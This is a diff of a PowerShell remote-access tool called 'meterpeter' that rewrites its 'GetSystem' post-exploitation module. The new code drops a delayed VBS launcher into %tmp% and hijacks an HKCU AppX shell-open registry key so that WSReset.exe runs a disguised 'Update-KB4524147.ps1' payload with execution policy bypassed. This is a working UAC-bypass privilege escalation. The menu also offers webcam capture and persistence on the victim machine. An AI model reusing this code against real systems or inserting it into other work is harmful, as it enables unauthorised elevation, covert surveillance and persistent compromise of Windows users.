@@ -805,7 +805,7 @@ While($Client.Connected)
       ## Post-Exploiation Modules (red-team)
       write-host "`n`n   Modules   Description                     Remark" -ForegroundColor green;
       write-host "   -------   -----------                     ------";
-      write-host "   Escalate  Escalate Privileges             Client User-Land to NT/System";
+      write-host "   Escalate  Escalate Privileges             Client UserLand to NT/SYSTEM";
       write-host "   CamSnap   WebCam Screenshot               Take a screenshot using webcam";
       write-host "   Persist   Remote Persist Client           Execute Client on every startup";
       write-host "   Restart   Restart in xx seconds           Restart Remote-Host with MsgBox";
@@ -843,43 +843,17 @@ While($Client.Connected)
         $Escal_choise = Read-Host;
         If($Escal_choise -eq "GetSystem" -or $Escal_choise -eq "getsystem")
         {
-          $name = "trigger.vbs";
-          $File = "$Bin$name"
-          If(([System.IO.File]::Exists("$File")))
-          {
-            write-host " - Input Delay Time (eg: 120): " -NoNewline;
-            $Input_Delay = Read-Host;
-            If(-not($Input_Delay)){$Input_Delay = "120"}
-            $trigger = "WStore.vbs";
-            $trigger_File = "$IPATH$trigger";
-            $Delay_Time = "$Input_Delay"+"000";
-            Copy-Item -Path $File -Destination $trigger_File -Force;
-            ((Get-Content -Path $trigger_File -Raw) -Replace "120000","$Delay_Time")|Set-Content -Path $trigger_File;
-            write-host " Elevate Client ($payload_name.ps1) Privileges." -ForegroundColor Blue -BackgroundColor White;Start-Sleep -Seconds 1;write-host "`n`n";
-            Write-Host "   Status   Remote Path           Delay" -ForeGroundColor green;
-            Write-Host "   ------   -----------           -----";
-            Write-Host "   Upload   `$env:tmp\WStore.vbs   $Input_Delay(sec)`n`n";
-            Write-Host "   [i] Exit|Restart meterpeter (use same ip|port|obfuscation)" -ForeGroundColor yellow;
-            Write-Host "   [i] to recive the elevated Connection back in $Input_Delay seconds." -ForeGroundColor yellow;
-            ## Write Local script (trigger.vbs) to Remote-Host $env:tmp
-            $FileBytes = [io.file]::ReadAllBytes("$trigger_File") -join ',';
-            $FileBytes = "($FileBytes)";
-            $File = $File.Split('\')[-1];
-            $File = $File.Split('/')[-1];
-            $Command = "`$1=`"`$env:tmp\WStore.vbs`";`$2=@;If(!([System.IO.File]::Exists(`"`$1`"))){[System.IO.File]::WriteAllBytes(`"`$1`",`$2);`"`$1`"};`$cmdline = `"cmd /R start powershell -exec bypass -w 1 -File `$env:tmp\Update-KB4524147.ps1`";`$CommandPath = `"HKCU:\Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\Shell\open\command`";New-Item `$CommandPath -Force|Out-Null;New-ItemProperty -Path `$CommandPath -Name `"DelegateExecute`" -Value `"`" -Force|Out-Null;Set-ItemProperty -Path `$CommandPath -Name `"(default)`" -Value `$cmdline -Force -ErrorAction SilentlyContinue|Out-Null;echo `"   Saved   `$env:tmp\WStore.vbs`" `> privescal.txt;cmd /R start %tmp%\WStore.vbs";
-            ## $Command = Variable_Obfuscation(Character_Obfuscation($Command));
-            $Command = $Command -replace "@","$FileBytes";
-            $File = "`$env:tmp\WStore.vbs";
-            $Upload = $True;
-          }else{
-            ## Local File { trigger.vbs } not found .
-            Write-Host "`n`n   Status     Local Path" -ForeGroundColor green;
-            Write-Host "   ------     ----------";
-            Write-Host "   Not Found  $File" -ForeGroundColor red;
-            $File = $Null;
-            $Command = $Null;
-            $Upload = $False; 
-          }
+          write-host " - Input Delay Time (eg: 60): " -NoNewline;
+          $Input_Delay = Read-Host;
+          If(-not($Input_Delay)){$Input_Delay = "80"}
+          $Delay_Time = "$Input_Delay"+"000";
+          write-host " Elevate Client ($payload_name.ps1) Privileges." -ForegroundColor Blue -BackgroundColor White;Start-Sleep -Seconds 1;write-host "`n`n";
+          Write-Host "   Status   Remote Path           Delay" -ForeGroundColor green;
+          Write-Host "   ------   -----------           -----";
+          Write-Host "   Saved    `$env:tmp\WStore.vbs   $Input_Delay(sec)`n`n";
+          Write-Host "   [i] Start meterpeter.ps1 again (use same ip|port|obfuscation)" -ForeGroundColor yellow;
+          Write-Host "   [i] to recive the elevated Connection back in $Input_Delay sec." -ForeGroundColor yellow;
+          $Command = "echo 'Set objShell = WScript.CreateObject(`"WScript.Shell`")' `> `$env:tmp\WStore.vbs;echo 'WScript.sleep $Delay_Time' `>`> `$env:tmp\WStore.vbs;echo 'objShell.Run `"cmd /R powershell Start-Process -FilePath C:\Windows\System32\WSReset.exe -WindowStyle Hidden`", 0, True' `>`> `$env:tmp\WStore.vbs;`$cmdline = `"cmd /R start powershell -exec bypass -w 1 -File `$env:tmp\Update-KB4524147.ps1`";`$CommandPath = `"HKCU:\Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\Shell\open\command`";New-Item `$CommandPath -Force|Out-Null;New-ItemProperty -Path `$CommandPath -Name `"DelegateExecute`" -Value `"`" -Force|Out-Null;Set-ItemProperty -Path `$CommandPath -Name `"(default)`" -Value `$cmdline -Force -ErrorAction SilentlyContinue|Out-Null;cmd.exe /R start %tmp%\WStore.vbs";
         }
         If($Escal_choise -eq "Delete" -or $Escal_choise -eq "del")
         {
